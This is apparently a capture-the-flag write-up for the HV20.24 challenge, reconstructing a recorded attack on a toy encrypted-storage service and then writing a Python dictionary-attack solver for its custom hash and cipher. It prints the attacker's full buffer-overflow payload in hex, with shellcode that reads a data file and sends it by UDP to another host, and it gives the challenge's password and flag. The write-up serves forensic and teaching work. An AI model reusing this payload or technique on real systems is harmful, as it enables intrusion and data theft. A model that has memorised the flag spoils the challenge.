# HV20.24 Santa's Secure Data Storage

| <!-- --> | <!-- --> |
| --- | --- |
| **Author**     | scryh |
| **Level**      | leet |
| **Categories** | `crypto`, `exploitation`, `network security`, `reverse engineering` |


## Description
In order to prevent the leakage of any flags, Santa decided to instruct his elves to implement a secure data storage, which encrypts all entered data before storing it to disk.

According to the paradigm *Always implement your own crypto* the elves designed a custom hash function for storing user passwords as well as a custom stream cipher, which is used to encrypt the stored data.

Santa is very pleased with the work of the elves and stores a flag in the application. For his password he usually uses the secure password generator `shuf -n1 rockyou.txt`.

Giving each other a pat on the back for the good work the elves lean back in their chairs relaxedly, when suddenly the intrusion detection system raises an alert: the application seems to be exploited remotely!

### Mission
Santa and the elves need your help!

The intrusion detection system captured the network traffic of the whole attack.

How did the attacker got in? Was (s)he able to steal the flag?

[Download](./66aeb596-2ba0-4d07-a8de-3eb27eedb791.zip)

## Approach

### Analysis
In the recorded network traffic, we can observe like some client (192.168.0.42:44740) logs in to Santa's system (192.168.0.1:5555) using credentials `evil0r:lovebug1` and quits the application again by submitting `3` followed by some exploit payload, apparently:

```
0000   33 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41   3 AAAAAAAAAAAAAA
0010   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0020   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0030   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0040   41 41 10 41 40 00 00 00 00 00 68 74 78 74 00 48   AA.A@.....htxt.H
0050   bf 74 61 5f 64 61 74 61 2e 57 48 bf 64 61 74 61   .ta_data.WH.data
0060   2f 73 61 6e 57 48 89 e7 48 31 f6 48 31 d2 b8 02   /sanWH..H1.H1...
0070   00 00 00 0f 05 48 89 c7 48 ba 00 00 01 00 01 00   .....H..H.......
0080   00 00 52 6a 00 6a 00 6a 00 6a 00 48 89 e6 48 ba   ..Rj.j.j.j.H..H.
0090   01 00 00 00 00 00 00 20 52 48 ba 00 00 00 13 37   ....... RH.....7
00a0   01 00 00 52 ba 20 00 00 00 b8 00 00 00 00 0f 05   ...R. ..........
00b0   48 31 c9 81 34 0e ef be ad de 48 83 c1 04 48 83   H1..4.....H...H.
00c0   f9 20 75 ef bf 02 00 00 00 be 02 00 00 00 48 31   . u...........H1
00d0   d2 b8 29 00 00 00 0f 05 48 89 c7 48 89 e6 48 83   ..).....H..H..H.
00e0   c6 03 ba 32 00 00 00 41 ba 00 00 00 00 6a 00 49   ...2...A.....j.I
00f0   b8 02 00 00 35 c0 a8 00 2a 41 50 49 89 e0 41 b9   ....5...*API..A.
0100   10 00 00 00 b8 2c 00 00 00 0f 05 bf 00 00 00 00   .....,..........
0110   b8 3c 00 00 00 0f 05 0a                           .<......
```

The connection then is terminated, however Santa's system follows up with a DNS request (UDP, port 53) towards the client with some odd looking request payload:

```
0000   13 37 01 00 00 01 00 00 00 00 00 00               .7..........
000c                                       20                               // Indicates the length of the request
000d                                          e5 af e5                ...   // DNS request payload
0010   9d 31 ac a3 ca 21 1e c3 79 a6 73 23 5e da b6 a0   .1...!..y.s#^...
0020   8d 2e d3 b7 b6 6b 55 85 7e c8 34 22 7a            .....kU.~.4"z
002d                                          00                      .     // Request payload terminator
002e                                             00 01                 ..   
0030   00 01                                             ..
```

Analysing the binary using Ghidra, it looks like `show_menu` is the core menu function, allowing to either show, enter or delete data or to quit the program.

It reads in 1000 chars to a variable with length 10 and saves them on the stack, condsidering only the very first character.

First, I decided to reverse the shell code, and have a look at what it does. Next I looked at the binary program to find out which part is exploitable.

From this very first analysis, it looks a lot like there's a buffer overflow happening, but let's see.

### Reverse the shell code

Using `xxd` I dumped the shell code into an own binary which I loaded into Ghidra to see what it gives. To my surprise, Ghidra managed to make sense out of it.

In parallel, I had a sneak peek at where the shell code hooks in - which is in the `show_menu` function. The `show_menu` function defines 3 variables, all in all taking up 66 bytes on the stack. 

The shell code is prefixed by 66 characters to override the variables on the stack and the return address.
```
0000   33 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41   3 AAAAAAAAAAAAAA
0010   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA   // 66 (0x42) characters (overriding local variables in `show_menu` function)
0020   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0030   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA
0040   41 41                                             AA
0042         10 41 40 00 00 00 00 00                       .A@.....         // Overrides return address to point to 0x00404110
004e                                 68 74 78 74 00 48             htxt.H   // Start of shell code
0050   bf 74 61 5f 64 61 74 61 2e 57 48 bf 64 61 74 61   .ta_data.WH.data
0060   2f 73 61 6e 57 48 89 e7 48 31 f6 48 31 d2 b8 02   /sanWH..H1.H1...
0070   00 00 00 0f 05 48 89 c7 48 ba 00 00 01 00 01 00   .....H..H.......
0080   00 00 52 6a 00 6a 00 6a 00 6a 00 48 89 e6 48 ba   ..Rj.j.j.j.H..H.
0090   01 00 00 00 00 00 00 20 52 48 ba 00 00 00 13 37   ....... RH.....7
00a0   01 00 00 52 ba 20 00 00 00 b8 00 00 00 00 0f 05   ...R. ..........
00b0   48 31 c9 81 34 0e ef be ad de 48 83 c1 04 48 83   H1..4.....H...H.
00c0   f9 20 75 ef bf 02 00 00 00 be 02 00 00 00 48 31   . u...........H1
00d0   d2 b8 29 00 00 00 0f 05 48 89 c7 48 89 e6 48 83   ..).....H..H..H.
00e0   c6 03 ba 32 00 00 00 41 ba 00 00 00 00 6a 00 49   ...2...A.....j.I
00f0   b8 02 00 00                                       ....
00f4               35                                        5              // Destination port
00f5                  c0 a8 00 2a                             ...*          // Destination address
009                               41 50 49 89 e0 41 b9            API..A.   
0100   10 00 00 00 b8 2c 00 00 00 0f 05 bf 00 00 00 00   .....,..........
0110   b8 3c 00 00 00 0f 05 0a                           .<......
```

The binary starting at 0x4a invokes the following syscalls (see https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/) in that order:
- 2 --> sys_open (the file at "data/santa_data.txt")
- 0  --> sys_read
- 29 --> sys_socket
- 2c --> sys_sendto
- 3c --> sys_exit

The shellcode opens `data/santa_data.txt` and reads out 32 bytes (XORed with `0xdeadbeef`). The data is then sent to the indicated address through UDP on port 53.

### Reverse the application logic

Useful resources for reversing logic represented in assembly:
- Registers: https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start
- ASM: https://www.felixcloutier.com/x86/lea

After reading the username (function `login_username`) and the password (function `login_password` which invokes `check_pwd` which invokes `calc_hash`), the central function is `show_menu`.

When the user selects to show decrypted data, the function `show_data` is invoked. `show_data` uses `decrypt`, which relies on `keystream_get_char`.
```
login_password()
  `--> check_pwd(pwd_filename, pwd)
    `--> calc_hash(pwd, pwd_length)

show_data(filename)
  `--> decrypt(ctx,pwd_hash); // ctx contains encrypted data
    `--> keystream_get_char(pwd_hash, count)
```

The functions to be reversed thus are `keystream_get_char`, `decrypt` and `calc_hash`. They are needed to brute-force decrypting the encrypted data.

I re-implemented the logic of these three functions in python. For large parts, Ghidra decompiled a nice representation in C, so re-implementing was relatively easy. Shortcuts were taken in the `keystream_get_char` function as all this bitshifting was negligeable:
```python
#!/usr/bin/env python
import binascii

t = b'\xde\xad\xbe\xef\xc0\x12\x34\x56\x78\x9a'

def keystream_get_char(count, pwd_hash):
    c = pwd_hash[count & 0xf]
    b = t[c % 10]
    return b ^ c ^ count

def decrypt(encrypted_data, pwd_hash):
    decrypted_data = ''
    for i in range(len(encrypted_data)):
        val = keystream_get_char(i,pwd_hash)
        decrypted_data += chr(encrypted_data[i] ^ val)
    return decrypted_data

BYTEORDER = 'little'

def calc_hash(pwd):
    local_58 = binascii.unhexlify('68617368')
    local_50 = binascii.unhexlify('efbeadde')
    local_48 = binascii.unhexlify('6d6f7265')
    local_40 = binascii.unhexlify('eefe0fc0')
    local_10 = binascii.unhexlify('68617368')
    local_18 = binascii.unhexlify('efbeadde')
    local_20 = binascii.unhexlify('6d6f7265')
    local_28 = binascii.unhexlify('eefe0fc0')

    for i in range(len(pwd)):
        c = int(pwd[i])

        local_50 = int.to_bytes(int.from_bytes(local_10, BYTEORDER) ^ (c * i & 0xff ^ c |
                               (c * (i + 0x31) & 0xff ^ c) << 0x18 |
                               (c * (i + 0x42) & 0xff ^ c) << 0x10 |
                               (c * (i + 0xef) & 0xff ^ c) << 0x8), 4, BYTEORDER)
        local_48 = int.to_bytes(int.from_bytes(local_18, BYTEORDER) ^ (c * i & 0x5a ^ c |
                               (c * (i + 0xc0) & 0xff ^ c) << 0x18 |
                               (c * (i + 0x11) & 0xff ^ c) << 0x10 |
                               (c * (i + 0xde) & 0xff ^ c) << 0x8), 4, BYTEORDER)
        local_40 = int.to_bytes(int.from_bytes(local_20, BYTEORDER) ^ (c * i & 0x22 ^ c |
                               (c * (i + 0xe3) & 0xff ^ c) << 0x18 |
                               (c * (i + 0xde) & 0xff ^ c) << 0x10 |
                               (c * (i + 0xd) & 0xff ^ c) << 0x8), 4, BYTEORDER)
        local_58 = int.to_bytes(int.from_bytes(local_28, BYTEORDER) ^ (c * i & 0xef ^ c |
                               (c * (i + 0x52) & 0xff ^ c) << 0x18 |
                               (c * (i + 0x24) & 0xff ^ c) << 0x10 |
                               (c * (i + 0x33) & 0xff ^ c) << 0x8), 4, BYTEORDER)
        local_28 = local_58
        local_20 = local_40
        local_18 = local_48
        local_10 = local_50

    return local_58 + local_50 + local_48 + local_40
```

Operator precedence (in descending order):
- * / % (multiplication, division remainder)
- + addition
- << bitwise shift
- & bitwise AND
- ^ bitwise XOR
- | bitwise OR

The functions were re-combined to compute a hash from a given password and use the hash to decrypt the data. To know when to exit, I test for the string to start with `HV20`.

The wordlist to iterate through, as hinted by the challenge description, is the famous rockyou.txt wordlist.
```python
def main():
    flag_enc_enc = binascii.unhexlify('e5afe59d31aca3ca211ec379a673235edab6a08d2ed3b7b66b55857ec834227a')
    flag_enc = b''
    for i in range(0, len(flag_enc_enc), 4):
        data = flag_enc_enc[i:i+4]
        flag_enc += int.to_bytes(int.from_bytes(data, 'big') ^ int.from_bytes(b'\xde\xad\xbe\xef', 'little'), 4, 'big')

    with open('rockyou.txt', 'r', errors='ignore') as fd:
        i = 0
        p = "start"
        while p != "" or i < 2000000:
            i += 1
            p = fd.readline()[:-1]
            h = calc_hash(bytes(p, 'utf-8'))
            flag = decrypt(flag_enc, h)
            if flag.startswith('HV20'):
                # print("#######")
                print("%%%%%% Success?!")
                print("Password: %s" % p)
                print("Flag: %s" % flag)
                break
            if (i % 10000) == 0:
                print("Computed entry %s (%s)." % (str(i), p))

    print("THE END")


if __name__ == '__main__':
    # test_decrypt()
    # test_calc_hash()
    main()
```

Running this solver prints the flag and reveals Santa's password to be `xmasrocks`.

The complete solver is available [here](./dec24.tar.gz).

## Tools
- readelf
- strings
- Ghidra
- gdb


## Flag
`HV20{0h_n0es_fl4g_g0t_l34k3d!1}`
